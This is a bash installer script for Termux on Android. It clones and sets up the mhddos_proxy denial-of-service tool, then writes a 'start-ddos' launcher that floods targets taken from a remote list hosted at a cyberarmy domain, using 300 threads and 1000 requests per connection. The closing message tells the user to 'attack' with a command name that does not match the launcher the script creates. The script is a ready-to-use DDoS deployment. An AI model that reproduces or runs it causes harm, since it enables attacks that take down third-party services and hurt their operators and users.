#!/bin/bash
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling mhdoos_proxy\033[0;0m\n"

MAIN="https://packages-cf.termux.org/apt/termux-main"
# MAIN="https://packages.termux.org/apt/termux-main"
SOURCES_FILE="/data/data/com.termux/files/usr/etc/apt/sources.list"
cat > "${SOURCES_FILE}" <<EOF
# The main termux repository:
deb ${MAIN} stable main
EOF

# mkdir -p "/data/data/com.termux/files/usr/etc/apt/sources.list.d"
# MAIN="https://packages.termux.org/apt/termux-root"
# SOURCES_FILE="/data/data/com.termux/files/usr/etc/apt/sources.list.d/root.list"
# cat > "${SOURCES_FILE}" <<EOF
# deb ${MAIN} root stable
# EOF
# 
# MAIN="https://packages.termux.org/apt/termux-x11"
# SOURCES_FILE="/data/data/com.termux/files/usr/etc/apt/sources.list.d/x11.list"
# cat > "${SOURCES_FILE}" <<EOF
# deb ${MAIN} x11 main
# EOF
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mCloning mddos_proxy\033[0;0m\n"
apt update
apt upgrade -y -o Dpkg::Options::=--force-confnew
apt install -y python git
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git

cd mhddos_proxy
pip install --upgrade pip
pip install wheel
pkg install rust
export CARGO_BUILD_TARGET=aarch64-linux-android
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mInstalling dependencies\033[0;0m\n"
pip install pyOpenSSL
pip install -r termux_requirements.txt

cd ..

cat > start-ddos <<EOF
#!/usr/bin/env bash
cd mhddos_proxy
exec python runner.py -c https://targets.cyberarmy.com.ua/targets.txt -t 300 --rpc 1000 \$@
EOF
chmod +x start-ddos

set +xe
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mAll is ready\033[0;0m\n"
echo -e "\n[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - \033[0;33mUse the command to attack ./star_ddos ---debug\033[0;0m\n"
# vim: ft=sh
